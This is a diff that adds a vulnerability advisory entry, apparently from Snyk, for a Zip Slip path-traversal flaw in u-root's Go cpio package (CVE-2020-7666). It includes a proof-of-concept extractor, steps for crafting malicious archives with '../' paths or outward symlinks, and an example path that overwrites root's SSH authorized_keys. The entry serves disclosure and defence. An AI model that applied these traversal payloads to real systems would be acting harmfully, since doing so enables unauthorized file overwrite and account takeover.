@@ -1,0 +1,58 @@
+---
+- id: snykio:go:github.com/u-root/u-root/pkg/cpio:570440
+  title: Arbitrary File Write via Archive Extraction (Zip Slip)
+  description: "[github.com/u-root/u-root/pkg/cpio][1] is a package that provides
+    Go\nversions of standard Linux tools and bootloaders. It also provides tools\nfor
+    compiling Go programs in a single binary and creating initramfs\nimages.\n\nAffected
+    versions of this package are vulnerable to Arbitrary File Write\nvia Archive Extraction
+    (Zip Slip). It is vulnerable to leading,\nnon-leading relative path traversal
+    attacks and symlink based (relative\nand absolute) path traversal attacks in cpio
+    file extraction.\n\n### PoC by Georgios Gkitsas of Snyk Security Team   {#poc-by-georgios-gkitsas-of-snyk-security-team}\n\npoc.go:\n\n
+    \   package main\n    \n    import (\n        \"io\"\n        \"log\"\n        \"os\"\n
+    \       \"github.com/u-root/u-root/pkg/cpio\"\n    )\n    \n    \n    func main()
+    {\n        archiver, err := cpio.Format(\"newc\")\n        if err != nil {\n            log.Fatalf(\"Format
+    -H newc not supported: %v\", err)\n        }\n    \n        var inums map[uint64]string\n
+    \       inums = make(map[uint64]string)\n    \n        rr := archiver.Reader(os.Stdin)\n
+    \       for {\n            rec, err := rr.ReadRecord()\n            if err ==
+    io.EOF {\n                break\n            }\n            if err != nil {\n
+    \               log.Fatalf(\"error reading records: %v\", err)\n            }\n
+    \   \n            if rec.Info.FileSize == 0 {\n                if _, ok := inums[rec.Info.Ino];
+    ok {\n                    err := os.Link(inums[rec.Info.Ino], rec.Name)\n                    if
+    err != nil {\n                        log.Fatal(err)\n                    }\n
+    \                   continue\n                }\n            }\n            inums[rec.Info.Ino]
+    = rec.Name\n            if err := cpio.CreateFile(rec); err != nil {\n                log.Printf(\"Creating
+    %q failed: %v\", rec.Name, err)\n            }\n        }\n    }\n\n* Build the
+    executable `go build poc.go`\n* Run `./poc < archive.cpio` with \\\"archive.cpio\\\"
+    being a cpio archive\n  that includes at least one of the following:\n\n1.  file
+    with filepath that uses leading or non-leading \\\"../\\\"\n2.  file symlink that
+    point outside of the current directory (relative\n    or absolute)\n3.  directory
+    symlink that point outside of the current directory\n    (relative or absolute)
+    followed by a file under that directory\n\n\n\n[1]: http://github.com/u-root/u-root/pkg/cpio\n\\nIt
+    is exploited using a specially crafted zip archive, that holds path\ntraversal
+    filenames. When exploited, a filename in a malicious archive\nis concatenated
+    to the target extraction directory, which results in the\nfinal path ending up
+    outside of the target folder. For instance, a zip\nmay hold a file with a \\\"../../file.exe\\\"
+    location and thus break out of\nthe target folder. If an executable or a configuration
+    file is\noverwritten with a file containing malicious code, the problem can turn\ninto
+    an arbitrary code execution issue quite easily.\n\nThe following is an example
+    of a zip archive with one benign file and\none malicious file. Extracting the
+    malicous file will result in\ntraversing out of the target folder, ending up in
+    `/root/.ssh/`\noverwriting the `authorized_keys` file:\n\n    \n    +2018-04-15
+    22:04:29 ..... 19 19 good.txt\n    \n    +2018-04-15 22:04:42 ..... 20 20 ../../../../../../root/.ssh/authorized_keys\n\n"
+  affected_package: github.com/u-root/u-root/pkg/cpio
+  vulnerable_versions:
+  - "*"
+  severity: high
+  package_manager: go
+  cve:
+  - CVE-2020-7666
+  cwe:
+  - CWE-22
+  disclosed_date: 2020-09-01
+  created_date: 2020-09-01
+  last_modified_date: 2020-09-01
+  credit:
+  - Georgios Gkitsas of Snyk Security Team
+  references:
+  - https://github.com/u-root/u-root/pull/1817
+  source_url: https://snyk.io/vuln/SNYK-GOLANG-GITHUBCOMUROOTUROOTPKGCPIO-570440
